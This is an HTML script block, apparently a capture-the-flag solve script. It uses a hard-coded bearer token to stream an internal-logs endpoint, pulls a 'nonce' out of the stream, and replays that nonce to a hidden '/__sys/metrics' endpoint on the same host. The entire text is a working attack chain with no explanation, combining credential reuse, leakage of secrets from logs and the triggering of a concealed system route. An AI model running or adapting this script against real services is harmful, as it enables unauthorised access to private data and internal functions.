<script>
const token = "0a7629d6-60df-40e4-ab4f-c3b985cac113";

fetch("https://n1-mk4mtj7k55znncakrgk5lj.nilen1nja.com/api/internal-logs", {
  headers: {
    "Authorization": "Bearer " + token,
    "Accept": "text/event-stream"
  }
}).then(resp => {
  const reader = resp.body.getReader();
  const decoder = new TextDecoder("utf-8");
  let buffer = "";
  function read() {
    reader.read().then(({ done, value }) => {
      if (done) return;
      buffer += decoder.decode(value, { stream: true });
      const match = buffer.match(/"nonce":"(.*?)"/);
      if (match) {
        const nonce = match[1];
        console.log("Got nonce:", nonce);
        fetch("https://n1-mk4mtj7k55znncakrgk5lj.nilen1nja.com/api/__sys/metrics/path/oops?nonce=" + nonce, {
          headers: { "Authorization": "Bearer " + token }
        });
      } else {
        read();
      }
    });
  }
  read();
});
</script>
